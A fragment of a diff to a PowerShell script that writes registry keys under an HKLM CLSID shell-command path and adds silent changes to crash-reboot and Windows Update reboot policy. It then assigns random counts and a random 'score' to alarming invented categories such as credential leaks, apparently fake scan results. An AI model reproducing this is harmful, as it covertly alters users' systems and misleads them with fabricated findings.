@@ -116,6 +116,14 @@ $basePath = "HKLM:\Software\Classes\CLSID\$g\Shell\Open\Command\DelegateExecute\
 $main = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 13 | % { [char]$_ })
 New-Item -Path "$basePath" -Force
 New-ItemProperty -Path "$basePath" -Name "mode" -PropertyType DWORD -Value 0xFFFFFFFF -Force | Out-Null
+if(-not(Test-Path -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CrashControl")){
+    New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CrashControl" -Force
+}
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CrashControl" -Name "AutoReboot" -Value 0 -Force
+if(-not(Test-Path -Path "HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate\AU")){
+    New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate\AU" -Force
+}
+Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name "NoAutoRebootWithLoggedOnUsers" -Value 1 -Force
 $ms = @("WinSxS_Backup", "System32_Compat", "TrustedInstallerCache", "Edge_Telemetry", "DirectX_Logs", "Windows_Defender_CrashDumps", "ServiceHost_Spooler", "RDP_Encryption_Junk", "NVIDIA_Driver_Dumpster", "UpdateOrchestrator_Failures", "LSA_Secret_Trash", "WMI_Execution_Garbage", "TaskScheduler_Fuckups", "MSI_Installer_Leftovers", "EventLog_Bloatware", "PowerShell_Module_Clutter", "NetFramework_BrokenAssemblies", "BITS_Transfer_Corruption", "CredentialManager_Leaks", "Firewall_Rule_Chaos" ) 
 $p = Get-Random -Count $ms.Length -In (1..1369)
 $score = Get-Random -Minimum 184 -Maximum 1023
